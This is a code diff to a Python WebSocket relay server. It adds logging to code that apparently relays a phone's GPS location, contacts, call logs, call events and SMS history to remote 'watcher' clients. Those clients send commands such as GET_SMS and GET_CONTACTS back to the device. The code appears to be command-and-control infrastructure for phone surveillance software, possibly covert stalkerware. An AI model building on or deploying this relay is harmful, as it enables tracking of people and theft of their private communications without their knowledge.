@@ -1,14 +1,19 @@
-import asyncio    
+import asyncio
 import aiohttp
 from aiohttp import web
 import random
 import string
 import os
+import time
 
 emitters  = {}
 listeners = {}
 watchers  = {}
 last_info = {}
+
+def log(code, msg):
+    ts = time.strftime("%H:%M:%S")
+    print(f"[{ts}][{code}] {msg}", flush=True)
 
 def gen_code():
     while True:
@@ -117,6 +122,7 @@ async def handle(request):
             if code not in watchers:
                 watchers[code] = set()
 
+            log(code, f"EMIT conectado")
             await safe_send_str(ws, f"CODE:{code}")
 
             # ✅ Si Specter ya está esperando — READY inmediato
@@ -136,6 +142,7 @@ async def handle(request):
                     txt = msg.data
                     if txt.startswith("INFO|"):
                         last_info[code] = txt
+                        log(code, "EMIT→INFO")
                         listener = listeners.get(code)
                         if listener and not listener.closed:
                             ok = await safe_send_str(listener, txt)
@@ -155,6 +162,7 @@ async def handle(request):
                         # GPS|, GET_INFO, CONTACTS|, CALL_LOG|, CALL_EVENT|,
                         # SMS_HISTORY| y cualquier otro mensaje del emisor
                         # → va al listener (JOIN) Y a todos los watchers.
+                        log(code, f"EMIT→txt: {txt[:40]!r}  watchers={len(watchers.get(code,set()))}")
                         listener = listeners.get(code)
                         if listener and not listener.closed:
                             ok = await safe_send_str(listener, txt)
@@ -192,6 +200,7 @@ async def handle(request):
                     pass
 
             listeners[code] = ws
+            log(code, "JOIN conectado")
             await safe_send_str(ws, "OK")
 
             # ✅ READY inmediato
@@ -223,6 +232,7 @@ async def handle(request):
             if code not in watchers:
                 watchers[code] = set()
             watchers[code].add(ws)
+            log(code, f"WATCH conectado  total={len(watchers[code])}")
             await safe_send_str(ws, "WATCHING")
 
             if code in last_info:
@@ -236,6 +246,7 @@ async def handle(request):
                 if msg.type == aiohttp.WSMsgType.TEXT:
                     # Comandos del watcher → reenviar al emisor
                     # (GET_CONTACTS, GET_CALL_LOG, GET_SMS, etc.)
+                    log(code, f"WATCH→EMIT: {msg.data!r}")
                     emitter = emitters.get(code)
                     if emitter and not emitter.closed:
                         await safe_send_str(emitter, msg.data)
